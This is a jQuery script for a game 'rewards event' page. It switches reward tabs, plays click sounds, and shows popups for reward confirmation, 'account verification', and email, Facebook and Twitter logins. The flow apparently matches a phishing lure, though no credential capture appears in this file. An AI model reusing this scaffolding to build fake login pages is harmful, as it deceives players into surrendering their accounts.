// code for activate clicked sound
var buka = new Audio();
buka.src = "https://l.top4top.io/m_1725u5z7i1.mp3";

var tutup = new Audio();
tutup.src = "https://a.top4top.io/m_1725zobal2.mp3";

function audioFile() {
  var audio = document.getElementById("audioFile");
  audio.play();
}
$(document).ready(function () {
  $("o").attr("onclick", "audioFile()");
});

// code for showing hiding items
function openRewards(evt, rewardsClass) {
  var i, tab_rewards, tab_rewards_link;
  tab_rewards = document.getElementsByClassName("tab_rewards");
  for (i = 0; i < tab_rewards.length; i++) {
    tab_rewards[i].style.display = "none";
  }
  tab_rewards_link = document.getElementsByClassName("menu-content");
  for (i = 0; i < tab_rewards_link.length; i++) {
    tab_rewards_link[i].className = tab_rewards_link[i].className.replace(
      " menu-content-active",
      ""
    );
  }
  document.getElementById(rewardsClass).style.display = "block";
  evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();

// code for showing hiding popup
function open_newhome() {
  $(".account_login").show();
  $(".newhome").hide();
}
function open_mail_login() {
  $(".login-mail").show();
  $(".account_login").hide();
}
function close_mail_login() {
  $(".login-mail").hide();
  $(".account_login").show();
}
function open_about_event() {
  $(".about_event").show();
}
function open_event_rules() {
  $(".event_rules").show();
}
function open_verification() {
  $(".account_verification").show();
  $(".open_rewards").hide();
  $(".otherReward_confirmation").hide();
  $(".itemReward_confirmation").hide();
}
function open_itemReward_confirmation(ag) {
  var itemReward_confirmationImg = $(ag).attr("src");
  $(".itemReward_confirmation").show();
  $("#myItemReward_confirmationImg").attr("src", itemReward_confirmationImg);
}
function open_itemReward_confirmation2(ag) {
  var itemReward_confirmationImg2 = $(ag).attr("src");
  $(".itemReward_confirmation2").show();
  $("#myItemReward_confirmationImg").attr("src", itemReward_confirmationImg2);
}
function open_itemReward_confirmation3(ag) {
  var itemReward_confirmationImg3 = $(ag).attr("src");
  $(".itemReward_confirmation3").show();
  $("#myItemReward_confirmationImg").attr("src", itemReward_confirmationImg3);
}
function open_itemReward_confirmation5(ag) {
  var itemReward_confirmationImg5 = $(ag).attr("src");
  $(".itemReward_confirmation5").show();
  $("#myItemReward_confirmationImg").attr("src", itemReward_confirmationImg5);
}
function open_itemReward_confirmation4(ag) {
  var itemReward_confirmationImg4 = $(ag).attr("src");
  $(".itemReward_confirmation4").show();
  $("#myItemReward_confirmationImg").attr("src", itemReward_confirmationImg4);
}
function open_itemReward_confirmation6(ag) {
  var itemReward_confirmationImg6 = $(ag).attr("src");
  $(".itemReward_confirmation6").show();
  $("#myItemReward_confirmationImg").attr("src", itemReward_confirmationImg6);
}
function open_otherReward_confirmation(ag) {
  var otherReward_confirmationImg = $(ag).attr("src");
  var otherReward_confirmationValue = $(ag).attr("value");
  $(".otherReward_confirmation").show();
  $("#myOtherReward_confirmationImg").attr("src", otherReward_confirmationImg);
  $("#otherReward_confirmationValue").html(otherReward_confirmationValue);
}
function close_reward_confirmation() {
  $(".itemReward_confirmation").hide();
  $(".otherReward_confirmation").hide();
  $(".itemReward_confirmation2").hide();
  $(".itemReward_confirmation3").hide();
  $(".itemReward_confirmation4").hide();
  $(".itemReward_confirmation5").hide();
  $(".itemReward_confirmation6").hide();
  $(".newhome").hide();
}
function close_reward_confirmations() {
  $(".event_rules").hide();
  $(".about_event").hide();
}
function open_facebook() {
  $(".first-login-facebook").show();
  $(".account_login").hide();
}
function open_twitter() {
  $(".first-login-twitter").show();
  $(".account_login").hide();
}
function close_facebook() {
  $(".first-login-facebook").hide();
  $(".account_login").show();
}
function close_twitter() {
  $(".first-login-twitter").hide();
  $(".account_login").show();
}
function open_newhome() {
  $(".account_login").show();
  $(".newhome").hide();
}
function open_account_login() {
  $(".account_login").show();
  $(".itemReward_confirmation").hide();
  $(".newhome").hide();
}
